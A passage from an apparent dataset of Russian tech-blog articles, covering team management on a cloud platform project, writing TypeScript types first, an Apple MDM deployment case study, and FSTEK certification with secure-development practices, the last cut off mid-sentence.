мотивации можно сказать многое. Я выделю, по моему мнению, ключевые действия, которые помогают ее поддерживать:Выстраивать в команде взаимное доверие. Важно быть открытым, и тогда коллеги откроются в ответ. Без этого не получится настоящего сотрудничества. Чтобы этого добиться, я стараюсь общаться с командой как с людьми, а не как с подчиненными: спрашиваю, как дела, в жизни происходит, а потом уже перехожу к рабочим вопросам. Не стеснять команду лишними рамками. Например, частыми созвонами, пометкой каждого шага в таск-менеджере. Лучше, когда есть свобода для креатива и генерации идей. При этом контроль остается, но он становится ситуативным. Ребята знают, что в любой момент их могут спросить, как дела с задачей, и они должны будут что-то ответить. Налаживать горизонтальные связи внутри команды. Такие связи — это взаимодействие на равных, а не как «руководитель-подчиненный». Можно устраивать неформальные встречи, болтать в кофе-поинтах. Все это работает на то, чтобы создать самоуправляемую команду — я называю это «управленческий дзен». При таком формате у коллег есть четкая цель, которую они хотят достичь самостоятельно. Они сами приходят и рассказывают, как идет работа — для этого не надо стоять над душой и трястись за прогресс в каждом таске. А руководитель не закапывается в операционке, не контролирует каждый шаг и освобождает себе время для более важных задач — например, стратегического планирования.Как выстраиваю хорошие отношения в командеЯ сторонник атмосферы доверия и неформального общения. Когда я сформировал команду, я был заинтересован в том, чтобы ребята общались, взаимодействовали вне работы. Это поможет им стать не просто коллегами, но и приятелями. Я считаю, что при таком раскладе людям гораздо проще проявлять себя, в том числе и в работе.Хороший способ сплотиться — устраивать встречи команды за пределами офиса: сходить на обед в кафе вместо столовой, посидеть где-то после работы.Если у кого-то из команды есть общие интересы, можно поучаствовать в обсуждении. Делиться своими хобби и увлечениями — только приветствуется. Один из главных моих принципов — не вмешиваться, не модерировать естественное общение команды, если нет конфликта. Если руководитель вклинивается в общение, команда может менее уверенно проявлять себя и в работе. А задача у меня была противоположная: убрать ненужные рамки.Как провожу one-to-one встречиОдин из моих любимых методов — личные встречи с членами команды. Если просто по-человечески поинтересоваться, как у человека обстоят дела, можно выявить проблемы в самом начале.Какие могут быть проблемы? Да самые разные: выгорел, и поэтому едут сроки, не нравится кто-то из команды, с чем-то не согласен или вообще что-то приключилось в жизни, и нужен дэй-офф или даже отпуск.Как по мне, оптимальная периодичность встреч — 1-2 раза в неделю. Если проводить реже, можно упустить что-то важное: например, две недели назад человеку оффер сделали, а вы узнаете сильно позже, потому что «ван ту ваны» по календарю — раз в месяц.Как удерживаю членов командыВсе описанные мной предыдущие шаги — способы, которые мотивируют человека работать в команде. Поддерживать атмосферу, где можно открыто делиться тем, что волнует и не нравится, проводить регулярные, но не слишком частые one-to-one, давать свободу идеям — вот, что я использую.Но бывает и такое, что человека не удается понять. Или его загрузили не теми задачами, не вышло поддержать его интерес к проекту. Либо же случилось что-то, не имеющее отношения к проекту: разлад в семье, затяжной ремонт, проблемы со здоровьем. Может быть что угодно.Проблемы и настроения сотрудников важно отслеживать, но, конечно, не выпытывать, не стоять над душой. Для того и выстраивается доверительная атмосфера, чтобы коллега мог сам прийти и обо всем мне рассказать.У меня был случай, когда из-за личных обстоятельств продуктивность разработчика упала, и он не мог уделять проекту столько же времени, как в начале. Раньше он днями и ночами писал код, на выходных что-то делал, а сейчас это изменилось. Я начал думать — что с ним? Как потом выяснилось, по личным причинам человеку стало не до задач.Я не носился в панике с мыслями: «Он нас бросил!» Да нет же, не бросил. Проект долгосрочный, и я был не готов запускать новый цикл формирования команды. Решил дать этому разработчику разобраться с тем, что происходит у него в жизни. И он потом, воодушевленный и одухотворенный, вернулся к проекту.Как отношусь к контролю в высокорисковых проектахЧасто, чтобы показать кому-то из руководства, что процесс идет, а люди трудятся в поте лица, демонстрируют графики и таблицы — какие-нибудь диаграммы Ганта. Это хорошо для потоковых, конвейерных задач. Я считаю, что для высокорискового проекта это станет камнем преткновения, который будет ограничивать сотрудников и отнимать их время. Ведь получается, что вместо того, чтобы решать сложные задачи, специалисты заняты рутиной.Такие формальности я как руководитель беру на себя — все же без Ганта сегодня никуда. Но когда проект нелинейный, указывать точные сроки тяжело.Поэтому при планировании этапов высокорискового проекта я искал баланс — держал фокус на том, что мы в состоянии делать здесь и сейчас, и прописывал время выполнения именно для этих задач. Это позволяло четче планировать сроки, пусть и на более коротком отрезке. Компромисс — наше все!Применения методик управления командой в зависимости от классификации проектов. Источник: курс учебного центра «PM Expert» — «PMBOK v.7»«Управленческий дзен» за один день достичь невозможно. Только долгая планомерная работа приводит к состоянию, когда команда становится полностью самостоятельной и автономной. У меня обычно на это уходит от месяца до трех. Зато какой результат потом: ты ставишь новые цели, а команда сама все делает. Высвобождаемое время тратишь на планирование, а не на постоянный операционный контроль.Кульминация Нас с командой ждал успех — мы с нуля построили облачную платформу Cloud.ru Evolution и уложились в сроки, которые закладывали изначально 🎉. Сейчас платформа — первое, что мы предлагаем на сайте, она стала стратегическим продуктом компании.Резюмирую, что помогло команде добиться таких результатов:Вербовка людей с помощью финансовых и профессиональных рычагов. Это наиболее универсальный метод. На старте не так важно, что именно сыграет, главное — набрать команду. Я считаю, что всегда можно найти нужного человека, которому можно предложить то, чего нет в других командах или компаниях.Культура, в которой «банда» хочет творить и придумывать новое. Главный принцип — не встревать, а просто не мешать ребятам делать их работу. Инструментарий: неформальные встречи, упоминание побед, мягкое напоминание о целях — без стояния над душой и бесконечных тасков. Для идеального микса добавлю сюда атмосферу открытости и доверия.Регулярные one-to-one. Я выделяю это отдельно, потому что считаю, что такие встречи — мощный инструмент, с которым можно быстро понять, когда кому-то из команды плохо либо он задумывается переходе. Еще считаю важным выстраивать диалог в первую очередь с человеком, а не со специалистом — начинать беседу не со статусов задач, а с того, как у коллеги дела.Что стало с командой после проекта?По окончании проекта я обошел линейных руководителей своих ребят и еще раз подсветил: «Парни и девчонки сделали то-то и то-то. Учти это, пожалуйста, при оценке их работы и расчете премий». Так я хотел достичь нескольких целей:Показать руководству ценность их работников.Дополнительно поощрить ребят. Обещать повышение или надбавку я не могу, поскольку не распоряжаюсь бюджетом подразделения, но косвенно повлиять на это — в моих силах.Оставить возможность позвать коллег для будущей работы. Если мне потребуется привлечь ребят для другого проекта, они вспомнят мое содействие и с большей вероятностью пойдут на новую авантюру.Все получили премии, зарплаты проиндексировали. Кто-то перешел на новую должность: стал тимлидом или техлидом. Про всех ребят могу сказать, что профессионального веса и авторитета в компании они себе точно прибавили. В общем, в обиде никого не оставили.Один коллега — тот, которого я мотивировал билбордом на башне Москвы-сити — ушел из компании. Как он мне объяснил при личной беседе, он не нашел в компании такого же по размахам проекта. Коллеги сразу же кинулись меня расспрашивать, а повышалась ли у него зарплата — и да, ее поднимали ранее. Но не ради денег человек трудился в выходные и по ночам. Для него была важна идея, амбициозная цель и самореализация.Что касается меня, я перешел из одной команды в другую: раньше строил платформу в Change, сейчас эксплуатирую ее в команде Run. Не так давно завершился проект по приемке в эксплуатацию третьей зоны доступности, две уже построили и ввели в продакшн. Обкатали страшные сценарии в рамках Disaster Recovery Plan. Мне официально позволили сломать то, что я когда-то построил — и потом, естественно, восстановить. Потому что все-таки Disaster Recovery Plan.Как вам такой подход к работе с командой? Может, у вас есть какие-то иные решения, которые тоже круто сработали? Делитесь в комментариях."
33,Как заставить TS работать на вас,SM Lab,work + life + balance = SM Lab,0,"Веб-разработка, Программное обеспечение, Электронная коммерция",2025-04-10,"Привет! Меня зовут Дмитрий, и я уже много лет работаю с TypeScript. За это время я был частью разных команд с разным уровнем владения этим языком, в том числе тех, кто только готовился перевести проект с JavaScript. И нередко я замечал, что разработчики воспринимают TypeScript не как инструмент, упрощающий работу, а как рутинную обязанность, которая лишь замедляет процесс. В этой статье я расскажу, как сделать TypeScript своим союзником и заставить его работать на вас, а не против. Первая встреча с TypeScriptЧтобы понять, откуда берётся большинство проблем, начнём с самого начала. Почти все программисты переходят на TypeScript после долгой работы с JavaScript, сформировав определённые привычки и устоявшиеся практики.Главная проблема здесь, на мой взгляд, в том, что многие пытаются просто наложить TypeScript поверх JavaScript-кода стараясь удовлетворить требованиям назойливого компилятора, вместо того чтобы писать на TS изначально. Дальше мы разберёмся, как избавиться от старых привычек и научиться писать код так, чтобы TypeScript действительно облегчал работу.Метод черного ящикаОдна из распространенных ошибок разработчиков, переходящих с JavaScript на TypeScript, — игнорирование типизации на этапе написания кода. Вместо того чтобы заранее описывать ожидаемые данные, многие полагаются исключительно на автоматическое выведение типов (type inference), что может приводить к неожиданным ошибкам. Последовательно рассмотрим два подхода к разработке:1.     Классический — пишем исполняемый код, не задумываясь о типах;2.     TypeScript-ориентированный — определяем требования к типам, затем реализуем логику.Проблема автоматического вывода типовДопустим, мы разрабатываем компонент, который должен корректно обрабатывать ширину элемента так же, как это сделано, например, в компоненте VCard из Vuetify:<VCard width=""100"" /> <VCard width=""100px"" /> <VCard width=""100%"" />Начнем с привычного подхода — просто напишем код без явного указания типов:function defineElementWidth(value: string) {  // Тип не проверяется 😱  return {   width: `${value}рх`, // ❌ На самом деле px - кириллица 🤬  }; }  // ❌ Можно передать заведомо невалидное значение defineElementWidth('Не число');TypeScript не подсвечивает ошибку, потому что он не понимает, какие данные мы ожидаем. В результате неправильное значение спокойно проходит, и даже опечатка остается незамеченной.Явное определение типовТеперь попробуем задать строгие ограничения:// Явно указываем тип аргумента и возвращаемого значения function defineElementWidth(value: number): { width: `${number}px` } {  // Типы проверяются на соответствие ожидаемым  return {   width: `${value}px`, // ✅  }; } // Ошибки обнаруживаются на этапе написания кода defineElementWidth('Не число'); // ❌ defineElementWidth(100); // ✅Теперь функция защищена от ошибок, разработчик может быть абсолютно уверен, что реализация соответствует его ожиданиям.Доработка с учетом всех вариантовДобавим поддержку значений в px и в %, как во Vuetify:// TypeScript сразу покажет ошибку в реализации function defineElementWidth(value: number | `${number}%` | `${number}px` ): { width: `${number}${'px' | '%'}` } {  return {   width: `${value}px`, // ❌ Ошибка! value уже может содержать px или %  } }TypeScript мгновенно подскажет, что возвращаемый тип не соответствует ожидаемому без запуска кода и долгой отладки.Финальная реализацияТеперь создадим универсальное решение, которое корректно обрабатывает все допустимые значения:type Unit = `px` | '%'; type Width = number | `${number}` | `${number}${Unit}`; type Style = { width: `${number}${Unit}` };  function defineElementWidth(value: Width): Style {  if (typeof value === 'string') {   const match = value.match(/^(\d+)([a-zA-Z%]*)$/)?.slice(1).filter(Boolean) ?? [];   const [width = '0', unit = 'px'] = match;      return {    width: `${parseFloat(width)}${unit as Unit}`,   };  }    return {   width: `${value}px`,  }; }Обратите внимание, что мы сначала разобрались с типами, а потом шаг за шагом реализовали каждый из них получая подсказки на каждом шаге.Теперь функция корректно обрабатывает числа, строки и значения с единицами измерения, возвращает предсказуемый и строго типизированный объект, не допускает ошибок благодаря встроенной проверке типов.ВыводTypeScript работает эффективнее, если мы сначала определяем типы, а затем реализуем логику. Это позволяет получать подсказки от IDE прямо во время написания функции.Таким подходом лучше всего проникнуться на практике, попробуйте самостоятельно написать аналогичную функцию и внимательно следите за тем, как TypeScript помогает вам на каждом этапе: сначала определите все возможные сценарии использования функции, и только потом напишите исполняемый код.Типы и модульное тестирование Если вы знакомы с методологией Test Driven Development (TDD), то, возможно, заметили сходство, TDD предлагает похожий подход - сначала написать тесты и только потом исполняемый код.Этим подходы отлично дополняют друг друга, мы можем сначала определить типы и написать тесты, не имея готовой реализации..Однако TypeScript потребует, чтобы функция была реализована, поэтому можно использовать заглушку:// Заглушка позволяет не выдавать ошибки пока нет реализации function foo(): 'Foo' {   throw new Error('foo() is not implemented'); }  // Тест проверяет ожидаемый тип результата describe('foo()', () => {   it('foo() возвращает ""Foo""', () => {     const expected: ReturnType<typeof foo> = 'Foo';     expect(foo()).toBe(expected);   }); });Таким образом, мы можем извлечь сразу двойную пользу: получать подсказки при написании тестов и написании исполняемого кода в дальнейшем.Прокачка TSРабота с типами, как и с исполняемым кодом, со временем превращается в рутину. Количество повторяющихся операций растет, раздувая кодовую базу и увеличивая когнитивную нагрузку на команду.Однако, если при написании исполняемого кода мысль использовать стороннюю библиотеку приходит почти сразу, то при работе с типами это чаще не происходит вообще.Хорошая новость в том, что можно значительно облегчить жизнь команды, просто воспользовавшись специализированными библиотеками для работы с типами. Давайте разберемся, какие библиотеки существуют и как они могут помочь.Исправления встроенных типовНекоторые встроенные типы в TypeScript небезопасны или неудобным — так сложилось исторически. К счастью, есть библиотеки, которые исправляют эти недочеты:ts-reset types-springПересказывать их документацию смысла нет — она и так очень маленькая, лучше ознакомиться с ней самостоятельно по ссылкам выше. Дополнительные утилитыНесмотря на то, что из коробки TS имеет широкий набор утилит, со временем его оказывается недостаточно и разработчики начинают комбинировать утилиты в сложные конструкции и далеко не всегда они надежны.Чтобы облегчить команде жизнь, можно воспользоваться специализированными библиотеками.Чтобы избежать этого и сделать код более выразительным, можно воспользоваться специализированными библиотеками.Популярные библиотекиts-toolbelt type-fest utility-types sniptt/guards Если хочется сравнить их подробнее, рекомендую статью на Хабре, которая отлично раскрывает эту тему.Но, чтобы показать, насколько могут быть полезны продвинутые утилиты, разберем пример на основе ts-toolbelt — библиотеки, которую мы используем в нашей команде.Допустим, у нас есть объект Person, и нам нужно создать его версию, где некоторые поля становятся необязательными:// Из такого type Person = {  name: string;  age: number;  salary: number; }  // Сделать такой type Person = {  name: string;  age?: number;  salary?: number; }Решим эту задачу, используя только стандартные утилиты:type PersonOptional = Omit<Person, 'age' | 'salary'> & Partial<Pick<Person, 'age' | 'salary'>>;В глаза сразу бросаются количество требуемых утилит, вложенность одной в другую и, особенно, дублирование имен ключей.Теперь попробуем решить ту же задачу с помощью продвинутых утилит:import { Object } from ‘ts-toolbelt’;  type PersonOptional = Object.Optional<Person, 'age' | 'salary'>;Код стал значительно короче, а главное — понятнее.Если даже в таком простом случае разница ощутима, то при работе с по- настоящему сложными типами выгода становится еще более заметной.ВыводыЕсли позволить TypeScript помочь вам, он станет незаменимым инструментом, без которого вы уже не сможете представить свою работу.Программируйте на TS, а не боритесь с ним."
34,Как снизить нагрузку на техническую поддержку на 30%. Кейс Ринго и группы «Самолет»,Ринго MDM,Ринго — отечественный MDM для устройств Apple,0,Программное обеспечение,2025-04-10,"Ринго — российское решение для управления устройствами Apple в корпоративной среде.О компанииГруппа ""Самолет"" — крупный застройщик с развитой ИТ-инфраструктурой. В парке компании 500 MacBook, которые активно используются сотрудниками.Цели внедрения: добиться соответствия рабочих мест корпоративным стандартам, усилить безопасность,повысить удобство пользователей в работе.Как обстояла ситуация до внедрения MDMНа момент обращения в Ринго компания не использовала систему управления устройствами Apple. Были такие проблемыУстройства выдавались сотрудникам с локальными учетными записями и администраторскими правами, что приводило к проблемам с безопасностью.Локальные пароли не соответствовали требованиям корпоративной политики.Возникали проблемы с управлением Apple ID и функцией ""Локатор"": к компьютеру привязывалась личная учетная запись сотрудника.Отсутствие инструментов для автоматической установки приложений. Скачиваемые приложения никак не контролировались.Неудобства в настройке VPN и доступа к сетевым ресурсам вручную.Ручная установка и настройка агента для инвентаризации GLPI, что увеличивало время подготовки рабочих станций. Группа ""Самолет"" искала решение, которое позволило бы:Централизованно управлять устройствами.Настраивать и поддерживать корпоративные политики.Обеспечивать удобство работы администраторов и сотрудников.Снизить риски, связанные с безопасностью.Какие были этапыАнализ ситуации и формирование технического заданияМы всегда с клиентами в диалоге: обсуждаем их задачи, пожелания и предлагаем оптимальные решения, отталкиваясь от своего опыта и лучших практик Apple. Например, у группы  ""Самолет"" была проблема с доменными учетными записями пользователей. Для ее решения мы предложили использовать Kerberos SSO, и это отлично сработало. В результате сотрудникам стало проще входить в систему, а нагрузка на техподдержку снизилась.Также мы вместе с заказчиком составили список необходимого ПО, определили требования к безопасности и проработали сценарии подготовки устройств как для офисных сотрудников, так и для удаленных работников. Это позволило сделать процесс развертывания новых MacBook более оперативным и удобным.Как организовали работу по проектуЧтобы работа по проекту была максимально продуктивной, нужно выработать комфортный для всех сторон формат взаимодействия. Мы остановились на таком: еженедельные встречи для обсуждения задач и устранения проблем,общение в отдельном канале в Telegram для оперативного решения вопросов.ТестированиеКак правило, клиенты тестируют on-premise версию Ринго, но команда “Самолет” хотела on-cloud,  поэтому мы подготовили  отдельную облачную инсталляцию.К слову, только за время тестирования количество обращений по вопросам смены пароля сократилось на 30%, а по вопросам установки программ  снизилось почти  до нуля, так как все необходимое для работы ПО было уже предустановлено на макбуках.Настройка Ринго MDM Нужно отметить, что  компания ""Самолет"" еще приобрела расширенную поддержку, поэтому настройку выполняли вместе.  В такую поддержку входили:разработка скриптов и помощь с другими настройками,создание профилей MDM,сборка пакетов ПО,непосредственно обучение ИТ-команды девелопера “Самолет” по использованию MDM-системы,обучение команды 2-й линии техподдержки для оперативного взаимодействия с системой.В рамках внедрения были само собой настроены стандартные вещи, как:изменение названий устройств согласно корпоративным стандартам,соответствие учетных записей пользователей доменным,упрощение доступа к сетевым ресурсам (ярлыки на рабочем столе для сетевых дисков),организация автоматической настройки VPN-клиентов и сетевых параметров,предустановка и настройка офисного ПО: антивирусов, браузеров, мессенджеров и других корпоративных приложений,создание групп устройств для реализации сценариев настройки устройства в соответствии с отделом, в котором работает пользователь устройства,формирование смарт-групп для автоматизации рутинных процедур и мониторинга устройств, которые давно не выходили на связь с Ринго,Важно отметить, что смарт-группы можно создавать на основе разных критериев, ими могут выступать и данные, собранные в ходе инвентаризации.разработка дополнительного сценария для работы с уже эксплуатируемыми устройствами (об этом подробнее расскажем ниже).И, конечно, решили проблему с ручной установкой и настройкой агента для GLPI. С помощью Ринго удалось не только автоматизировать эту задачу, но и выбирать, какой пакет GLPI устанавливать в зависимости от типа процессора на компьютере Apple: Intel или Apple Silicon.В рамках настройки были и нестандартные задачи, как подготовка к распространению на устройствах системы защиты данных DLP (Data Loss Prevention). Однако возникли сложности с установкой агента для отечественного решения DLP:Стандартные настройки не работали,Пересборка могла решить часть проблем, но при этом аннулировалась бы нотаризация пакета, что привело бы к другим техническим сложностям.Сначала мы детально изучили вопрос, чтобы найти решение самостоятельно. Однако после нескольких неудачных попыток все же решили обратиться поддержку вендора.Коллеги оперативно подключились к решению: был собран индивидуальный пакет с нужными настройками. В результате пакет установился корректно без необходимости дополнительных скриптов и профилей.Сценарии работы с эксплуатируемыми устройствамиИзначально задача стояла иначе, требовалось управление только новыми устройствами, которые не были в эксплуатации. Но в процессе внедрения Ринго появилась потребность у клиента в управлении и уже используемыми устройствами. И здесь был другой сценарий работы и свои особенности. Требовалось реализовать эту задачу, не вмешиваясь в уже существующие сценарии настройки устройств.Для этих устройств мы провели следующие манипуляции:провели инвентаризацию текущего парка устройств,удалили старые локальные учетные записи и перенастроили устройства под единые корпоративные стандарты,подготовили и отправили на устройства необходимые приложения и политики,добавили возможность блокировки создания новых профилей и учетных записей для защиты от несанкционированного доступа.Что в итогеПосле внедрения Ринго все устройства управляются через единую платформу, а также выполнены цели:Соответствие требованиям безопасностиУдалены права администратора у пользователей, что снизило риски случайного изменения настроек.Заблокирована возможность создания новых учетных записей.Реализованы корпоративные стандарты и требования безопасности.Автоматизация управленияНастройка новых устройств выполняется автоматически при подключении.Установка и обновление приложений производится одной командой без участия сотрудников.Система Kerberos SSO позволила пользователям самостоятельно менять пароли, что упростило их работу и снизило нагрузку на техподдержку.Повышение удобстваСотрудники получили доступ ко всей необходимой инфраструктуре сразу после настройки устройства.Упрощена организация печати и работа с сетевыми ресурсами.Снижение нагрузки на ИТ-отделЗа счет перехода на механизм Kerberos SSO с помощью Ринго удалось уменьшить количество обращений, связанных со сменой пароляЗаявки на установку ПО практически исчезли благодаря предустановленному набору программ.Внедрение Ринго MDM помогло группе ""Самолет"" значительно упростить управление устройствами Apple, повысить уровень безопасности и привести инфраструктуру в соответствие с корпоративными стандартами. Тестирование показало, что 85% пользователей отметили улучшение работы с устройствами на macOS. Если хотите протестировать Ринго, то оставляйте заявку здесь. "
35,Сертификация ФСТЭК: как мы перестали бояться и полюбили процесс,Базис,Современные средства виртуализации,0,Программное обеспечение,2025-04-10,"Знаете, как обычно проходит первая встреча с сертификацией ФСТЭК? Примерно как встреча с медведем в лесу. Все знают, что он где-то есть, все слышали истории о том, как другие его видели, но пока не столкнешься сам — не поймешь масштаба.«Документации будет столько, что можно небольшой лес сохранить», «Год минимум, а то и полтора», «Придется выделить целую команду», «А потом еще и каждое обновление...» — такое слышишь постоянно. И когда мы только начинали, эти страшилки не казались преувеличением.Наибольший интерес вызывала перспектива регулярных инспекций. Продукт живой — он растет, развивается. У нас продуктов целая экосистема ПО виртуализации, десяток значимых обновлений каждый год, и каждое потребует инспекционного контроля. Но в какой-то момент стало понятно: либо мы научимся проходить сертификацию и последующие проверки красиво, либо увязнем в бесконечном марафоне.Спойлер: мы научились. Теперь сертификация ФСТЭК для нас — это не квест с неизвестным финалом, а понятный процесс с измеримыми параметрами. В этой статье мы не будем разбирать подробно, что нужно для сертификации – публикации с детальным списком документов можно найти на Хабре. Вместо этого поделимся своим опытом, и если вы сейчас стоите перед необходимостью пройти сертификацию или хотите оптимизировать существующий процесс — надеюсь, он поможет сделать этот путь немного проще.С чем придется иметь делоНачнем с небольшой справки. Сертификация ФСТЭК — не просто бюрократическая формальность, а серьезная проверка безопасности продукта. И требования там, надо сказать, вполне разумные.Допустим, ваше решение собирается использовать госорганизация или оно как-то связано с критической инфраструктурой. Либо, например, обрабатывает персональные данные. В этом случае вы точно попадаете под требование о сертификации, тут и начинается ваше приключение.Первое, с чем предстоит столкнуться, — это уровни доверия. Их всего шесть, от первого, самого строгого, до минимального шестого. Выбор уровня — важная часть. Если взять слишком высокий, замучаетесь проходить. Кроме того, первые три — для работы со всяким секретным, и вряд ли оно вам надо. Взять слишком низкий — можете отрезать себе часть потенциального рынка. Мы, например, пошли на четвертый уровень — он позволяет работать с госсистемами первого класса защищенности и при этом не требует совсем уж хардкорных мер.Уровень выбран, смотрим требования. Выглядят они, надо сказать, сложно и не очень приятно, но когда начинаешь разбираться, понимаешь — они логичны. И здесь важно понять вот что: к сертификации не придется готовиться КАЖДЫЙ РАЗ, если встроить ее требования в сам процесс разработки.Итак, что происходит, когда вы решаетесь на сертификацию? Процесс состоит из нескольких последовательных этапов, каждый из которых требует отдельного внимания. Первый — выбор испытательной лаборатории из реестра ФСТЭК. Опыт лаборатории в вашей конкретной области, ее подход к коммуникации, даже географическое расположение — все это может существенно повлиять на процесс сертификации. Поэтому подойдите к выбору со всей серьезностью, обратитесь к опытным людям, изучите доступные варианты. У нас получилось не с первого раза, но в итоге мы нашли лабораторию и отличную команду. Следующий этап — подготовка документации. Вам нужно детально описать архитектуру системы, все интерфейсы, каждую функцию безопасности. Все, что может быть задокументировано, должно быть задокументировано. Отдельного внимания заслуживает документация по процессам разработки и тестирования — здесь ФСТЭК особенно придирчив.Затем начинается непосредственно процесс проверки. Он включает статический анализ кода, динамическое тестирование, анализ уязвимостей, проверку на недекларированные возможности. По сути, это многоуровневый аудит безопасности, который охватывает все аспекты работы вашего продукта, от архитектуры решений до конкретных реализаций функций безопасности. Первый список замечаний от лаборатории обычно состоит из нескольких сотен пунктов, и каждый требует проработки.Например, статический анализатор находит потенциальную уязвимость в коде. Пофиксили и поехали дальше? Нет. Нужно не только исправить конкретный фрагмент кода, но и проверить, нет ли аналогичных проблем в других частях кода. А потом описать, как именно было сделано исправление, задокументировать изменения и убедиться, что они не создали новых проблем.Следующая история — это управление зависимостями. Любая внешняя библиотека (и другое внешнее ПО) должна быть проверена и задокументирована. И если в процессе сертификации выяснится, что какая-то библиотека не проходит по требованиям безопасности, — придется либо искать альтернативу, либо писать собственное решение. Отдельный круг ада — регулярные релизы. Каждое значимое обновление требует повторного прохождения части этих процедур. Без правильно выстроенных процессов это может превратиться в бесконечный цикл доработок и проверок, который будет тормозить развитие продукта.Что придется сделать Правильная организация процесса — это первое, что мешает сертификации превратиться в бесконечную борьбу с документами и проверками. У нас процесс перестройки процессов занял примерно 4–5 месяцев и очень непростых, надо отметить. Но в итоге выстроенный процесс сэкономил нам гораздо больше времени.Выстраивание процессовДля начала, если у вас нет отдельного подразделения технических писателей, нужно его завести. А если кто-то высказывает идею «в целях экономии» распределить задачи по документированию между разработчиками и менеджерами, киньте в него чем-нибудь: поначалу такой подход может сработать, но очень быстро превратится в головную боль для команд, а кончится все неструктурированным бардаком, на разгребание которого уйдет куча времени.  Технический писатель — это не тот, кто умеет красиво излагать мысли. В идеале это специалист, который понимает (или может разобраться), как должна выглядеть документация для регулятора, знает все требования к ее оформлению и умеет структурировать информацию так, чтобы она была понятна и разработчикам, и проверяющим. Нужны ли эти знания разработчикам? Захотят ли они тратить время на оформление документации по ГОСТу? Напишите в комментариях /sДалее — система версионирования документации. Тут мы, кстати, прошли через несколько итераций. Сначала пытались использовать облачные сервисы вроде Nexus Cloud. Казалось, что раз документы в облаке, с ними можно всем работать одновременно... Но по факту, когда несколько человек из разных отделов начинают править один документ, изменения сохраняются криво, версии конфликтуют и в итоге приходится тратить время на перепроверку каждой правки.В итоге пришли к локальным инструментам работы с документацией: четкое версионирование, возможность параллельной работы и, что важно, прозрачная история изменений. Теперь каждое подразделение — будь то разработка, безопасники или технические писатели — может работать со своей частью документации, не мешая друг другу.Следующий важный шаг — формирование команды сертификации. У нас она сложилась постепенно: пока специалисты испытательной лаборатории знакомились с продуктом, мы проводили демонстрации, готовили предварительную документацию. В процессе этой работы стало понятно, какие именно специалисты нужны для сертификации и как распределить роли. В нашу команду вошли представители разработки и тестирования, DevSecOps-инженер, ИБ-специалист, технические писатели и руководитель проекта, он же лид по сертификации.Сразу стоит сказать, что взаимодействие между командой разработки и командой сертификации нужно налаживать. Это отдельная задача, которая вряд ли решится сама собой. В нашем случае разработчики воспринимали требования сертификации как лишнюю бюрократию, отнимающую время, которое можно было бы потратить на  классные фичи и развитие продукта в целом. Решение нашли в том, чтобы сделать процесс максимально прозрачным: рассказали о целях сертификации, создали четкие регламенты, прописали зоны ответственности, установили понятные дедлайны для каждого этапа.Теперь, когда приходит время готовить новую версию к сертификации, все знают свою зону ответственности. Разработчики понимают, какие требования нужно учесть еще на этапе проектирования. Технические писатели знают, какую документацию нужно подготовить. А команда сертификации может спокойно планировать взаимодействие с испытательной лабораторией, не опасаясь, что в последний момент всплывет какой-нибудь неучтенный момент.Безопасная разработкаГлавное правило внедрения безопасной разработки, которое мы для себя вывели: начинать с малого и двигаться пошагово. Попытка сразу внедрить полный набор инструментов почти всегда приводит к перегрузке команды, которая начнет сопротивляться изменениям. Статический анализ кода (SAST) — это база. Большинство SAST-решений — open source, их легко интегрировать в процесс разработки, и они могут работать прямо в IDE. Это, по сути, как проверка орфографии, только для кода: находит очевидные проблемы еще на этапе написания. Мы используем, например, SonarQube и Mobile Security Framework. Они помогают обнаруживать небезопасные конфигурации, открытые пароли и другие типичные ошибки в коде.Анализ зависимостей (CSA) помогает выявить уязвимости в библиотеках, используемых приложением. Например, Dependency Check от OWASP проверяет зависимости на основе баз данных известных уязвимостей. С его помощью можно оперативно находить потенциально опасные компоненты.Динамический анализ (DAST) — проверяем приложение в процессе работы, чтобы выявить уязвимости, которые проявляются только при исполнении кода. Тут наш любимчик — OWASP ZAP.Интерактивный анализ (IAST) сочетает в себе функции статического, динамического и других видов анализа. Позволяет в реальном времени отслеживать потенциальные уязвимости в работающем приложении, предоставляя разработчикам четкие и понятные рекомендации по их устранению.Вдаваться в подробности здесь не будем, о внедрении безопасной разработки мы уже рассказывали на Хабре. Однако отметим одну из важных, но не слишком очевидных вещей, — концепция независимости проверки. Проверяющий не должен оказываться под давлением команды разработчиков и не должен от нее зависеть. Желательно, чтобы он подчинялся отдельной ветке управления, а в идеале — вообще генеральному директору. Иначе возникает риск компромиссов: security-ревьювер может начать помечать уязвимости как ложноположительные или переносить их в технический долг, вместо того чтобы требовать немедленного исправления. А это уже прямой путь к проблемам при сертификации.Мы используем подход Security Champions — это разработчики, которые выступают посредниками между командами. Они не обязательно имеют профильное образование, но готовы «вгрузиться» в вопросы безопасности. «Чемпионы» понимают и язык разработки, и требования безопасности. Когда безопасник говорит «у вас тут потенциальная RCE в legacy-коде», а разработчик отвечает «код на проде уже черт знает сколько крутится, когда проэксплуатируешь, тогда и приходи», подключается Security Champion. Его задача – донести до одной стороны позицию другой и найти компромиссное решение, которое вовсе не обязательно «где-то посередине». Главное, что в итоге один понимает сложность решения, второй понимает важность. Радость, счастье, проблема закрывается благодаря взаимодействию всех со всеми, а не через лишнюю эскалацию конфликта до руководства и многонедельную ругань. Работа с лабораторией Испытательная лаборатория становится вашим партнером на долгое время, поэтому правильную коммуникацию важно выстроить с самого начала. Мы сразу договорились о том, что лаборатория выделяет для нас постоянных специалистов: менеджера проекта и технических экспертов по каждому направлению. Это позволило им глубже погрузиться в специфику продукта, а нам — получать более предметную обратную связь.Взаимодействие команды разработки со специалистами из лаборатории (и шире – с вашими DevSecOps и AppSec-инженерами, которым тоже нужен доступ к коду) требует особого внимания. Первая реакция разработчиков обычно настороженная: кто-то будет копаться в их коде, искать проблемы, задавать неудобные вопросы. Здесь опять помогает прозрачность. Нужно рассказать, кто именно получит доступ к коду и зачем. Что эти люди — не враги и не критики, а партнеры. Что взаимодействие происходит в рабочем порядке: специалисты получают доступ к необходимым веткам и репозиториям, участвуют в обсуждении архитектурных решений на ранних этапах. Все это в итоге позволяет учесть требования безопасности и сертификации еще до начала разработки, вместо того чтобы пытаться встроить их потом в готовое решение (что создает нагрузку на тех же разработчиков).Еще тесное взаимодействие с лабораторией помогает вовремя получать важную информацию об актуальных изменениях в законодательстве. Один раз мы были уже на финальном этапе сертификации, буквально ждали подписания документов, когда вышли новые требования к базам данных. За неделю до финала. Пришлось в экстренном порядке пересматривать архитектуру и менять базу на другую. Как говорится, старайтесь по возможности избегать этого.С тех пор мы очень внимательно следим за всеми анонсами и проектами новых требований, а постоянное взаимодействие с лабораторией нам в этом помогает  И когда готовится новая версия продукта, мы сразу 